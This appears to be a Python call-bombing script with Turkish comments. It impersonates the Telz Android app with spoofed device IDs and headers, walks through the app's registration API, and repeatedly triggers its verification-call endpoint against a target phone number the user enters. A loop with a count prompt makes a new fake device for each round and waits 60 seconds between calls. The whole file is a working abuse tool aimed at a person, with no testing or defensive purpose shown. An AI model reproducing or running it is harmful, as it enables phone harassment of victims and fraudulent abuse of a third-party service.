import requests
import json
import time
import uuid
import random

class Caller:
    def __init__(self):
        self.base = "https://api.telz.com/"
        self.session = requests.Session()
        self.android_id = uuid.uuid4().hex[:16]
        self.uuid = str(uuid.uuid4())
        
    def headers(self):
        return {
            'User-Agent': 'Telz-Android/17.5.33',
            'Content-Type': 'application/json; charset=UTF-8',
            'Accept-Encoding': 'gzip',
            'X-Requested-With': 'XMLHttpRequest'
        }
    
    def send(self, endpoint, event, extra=None):
        payload = {
            "event": event,
            "android_id": self.android_id,
            "uuid": self.uuid,
            "ts": int(time.time() * 1000),
            "app_version": "17.5.33",
            "os": "android",
            "os_version": "15"
        }
        if extra:
            payload.update(extra)
        
        r = self.session.post(
            self.base + endpoint,
            data=json.dumps(payload),
            headers=self.headers(),
            timeout=10
        )
        return r.json()
    
    def ara(self, telefon):
        # 1. auth_list
        self.send("app/auth_list", "auth_list")
        time.sleep(0.5)
        
        # 2. run
        self.send("app/run", "run", {
            "device_name": f"Xiaomi-{uuid.uuid4().hex[:6]}",
            "ipv4_address": "10.1.10.1",
            "ipv6_address": "FE80::1",
            "lang": "tr",
            "network_country": "tr",
            "network_type": "4G",
            "roaming": "no",
            "root": "no",
            "run_id": ""
        })
        time.sleep(0.5)
        
        # 3. stat_btns (BUNA DİKKAT)
        self.send("app/stat_btns", "stat_btns", {"btn": "on_reg_continue"})
        time.sleep(0.5)
        
        # 4. validate_number
        self.send("app/validate_phonenumber", "validate_phonenumber", {
            "phone": telefon,
            "region": "TR"
        })
        time.sleep(0.5)
        
        # 5. auth_call (ASIL ARA)
        sonuc = self.send("app/auth_call", "auth_call", {
            "phone": telefon,
            "attempt": "0",
            "lang": "tr",
            "call_id": uuid.uuid4().hex
        })
        
        return sonuc

if __name__ == "__main__":
    target = input("Target (+90xxxxxxxxx): ").strip()
    if not target.startswith("+90"):
        target = "+90" + target.lstrip("0")
    
    count = int(input("Count: "))
    
    for i in range(count):
        c = Caller()
        sonuc = c.ara(target)
        print(f"[{i+1}] {sonuc}")
        
        if i < count - 1:
            print("60 saniye bekleniyor...")
            time.sleep(60)